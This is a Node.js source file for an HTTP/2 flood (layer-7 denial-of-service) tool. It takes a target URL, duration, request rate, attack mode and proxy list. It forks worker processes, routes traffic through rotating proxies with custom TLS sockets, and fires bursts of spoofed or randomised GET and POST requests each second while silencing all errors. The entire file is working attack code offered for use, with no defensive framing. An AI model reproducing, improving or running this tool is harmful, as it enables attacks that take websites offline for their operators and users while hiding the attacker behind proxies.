const url = require('url');
const http2 = require("http2");
const cluster = require('cluster');
const HeaderUtils = require('./HeaderUtils.js');
const ProxyUtils = require('./ProxyUtils.js');
const TLSUtils = require('./TLSUtils.js');
const EventEmitter = require("events").EventEmitter;

EventEmitter.defaultMaxListeners = 0;

const errorHandler = function(error) { };
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
process.on("warning", errorHandler);
process.setMaxListeners(0);


const [,, target, time, rps, Type, threads, ProxyPath] = process.argv;

if (!target || !time || !threads) 
{
    process.exit(1);
}

const attackType = parseInt(Type);
const PARSED_URL = url.parse(target);
const ProxySocket = new TLSUtils.NetSocket();
const proxyManager = new ProxyUtils.ProxyManager(ProxyPath);
const http2Settings = 
{ 
    headerTableSize: 65536,
    enablePush: false,
    initialWindowSize: 6291456,
    maxHeaderListSize: 262144
};


if (cluster.isMaster) 
{
    for (let counter = 1; counter < threads; counter++) 
    {
        cluster.fork();
    }
} 
else
{
    setInterval(fullsendboys);
}

function getHeaderType() 
{
    switch (attackType) 
    {
        case 0:
            return HeaderUtils.getHeaders(PARSED_URL, { Get: true });
        case 1:
            return HeaderUtils.getHeaders(PARSED_URL, { Get: true, query: true });
        case 2:
            return HeaderUtils.getHeaders(PARSED_URL, { Get: true, spoof: true }); 
        case 3:
            return HeaderUtils.getHeaders(PARSED_URL, { Post: true });
        case 4:
            return HeaderUtils.getHeaders(PARSED_URL, { mix: true });
        default:
            return HeaderUtils.getHeaders(PARSED_URL, { Get: true });
    }
}

function getProxyOptions(proxyAddress) 
{
    const [proxyHost, proxyPort] = proxyAddress.split(':');
    return {
        host: proxyHost,
        port: parseInt(proxyPort),
        address: PARSED_URL.host
    };
}

function fullsendboys() 
{
    const proxyAddress = proxyManager.getNextShuffled();
    const proxyOptions = getProxyOptions(proxyAddress);
    ProxySocket.HTTP(proxyOptions, function(connection, error)
    {
        if (error) return;
        const requestData = getHeaderType();
        const http2Client = http2.connect(PARSED_URL.href, 
        {
            settings: http2Settings,
            createConnection: () => TLSUtils.createCustomTLSSocket(connection, PARSED_URL)
        });
        http2Client.on("connect", (_, socket) =>
        {
            socket.allowHalfOpen = true;
            setInterval(function()  
            {
                const requests_storage = [];
                for (let i = 0; i < rps; i++)  
                {
                    requests_storage.push(Build(http2Client, requestData));
                }
                Promise.all(requests_storage);
            }, 1000);
        });
    });
}

function Build(http2Client, requestData) 
{
    return new Promise((resolve, reject) => 
    {
        http2Client.request(requestData).end();
    });
}

function Stop() 
{
    ProxySocket.destroyAllconnections();
    process.exit(-1);
}

setTimeout(Stop, time * 1000);